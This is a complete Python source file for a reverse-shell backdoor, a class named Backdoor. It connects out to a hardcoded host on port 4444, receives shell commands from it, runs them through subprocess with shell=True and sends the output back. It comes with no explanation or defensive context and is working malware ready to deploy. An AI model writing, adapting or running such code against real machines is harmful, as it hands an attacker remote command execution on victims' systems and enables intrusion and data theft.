#!/usr/bin/env python3
import socket
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.run()

    def reliable_send(self, data):
        if type(data) is str:
            json_data = json.dumps(data)
        else:
            json_data = json.dumps(data.decode('iso-8859-1'))
        self.connection.send(bytes(json_data, encoding='iso-8859-1'))

    def reliable_receive(self):
        json_data = ''
        max_rate = 10
        loop = 0
        while True:
            loop += 1
            try:
                json_data += self.connection.recv(1024).decode('iso-8859-1')
                return json.loads(json_data)
            except Exception as e:
                if loop == max_rate:
                    break
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            data = self.reliable_receive()
            print('<< ', data)
            if ':q' in data:
                self.reliable_send(':q')
                break
            try:
                result = self.execute_system_command(data)
                self.reliable_send(result)
            except Exception as e:
                self.reliable_send('[-] Exception - {}'.format(e))
        self.connection.close()


if __name__ == '__main__':
    Backdoor('192.168.0.10', 4444)
